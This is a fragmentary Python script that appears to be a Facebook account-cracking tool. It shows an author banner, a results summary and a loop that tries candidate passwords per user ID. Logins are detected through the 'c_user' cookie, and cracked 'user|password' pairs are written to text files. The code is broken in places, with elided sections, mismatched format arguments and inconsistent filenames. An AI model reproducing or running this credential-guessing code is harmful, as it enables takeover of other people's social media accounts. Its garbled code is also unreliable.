...
logo =                                          """   
\033[0;93md888888b  .d88b.   .d88b.  d8888b. 
 `~~88~~' .8P  Y8. .8P  Y8. 88  `8D 
    88    88    88 88    88 88oobY' 
    88    88    88 88    88 88`8b   
    YP     `Y88P'   `Y88P'  88   YD                                           
\033[1;93m------------------------\033[1;96m------------------------
\033[1;33m\033[1;32m Author \x1b[1;96m :\033[1;32m NAZIR
\033[1;33m\033[1;33m Facebook\x1b[1;96m:\033[1;33m AJMALO
\033[1;33m\033[1;36m GitHub\x1b[1;96m  :\033[1;36m GUSTAH5
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n \x1b[1;92mTOTAL OK : \x1b[1;92m %s  \x1b[1;92mTOOR_OK.txt' % (H, P, str(len(ok))))
	    print(' \x1b[1;91mTOTAL CP :\x1b[1;91m   %s \x1b[1;91mAJMALO_CP.txt' % (H, P, str(len(cp))))
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r\x1b[1;92m[AJMALO] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s[NAZIR-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        ...
                        pass
                    print('\r%s[TOOR-CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('PICCHI_CP.txt' , 'a').write('%s\n' % wrt)
                    break
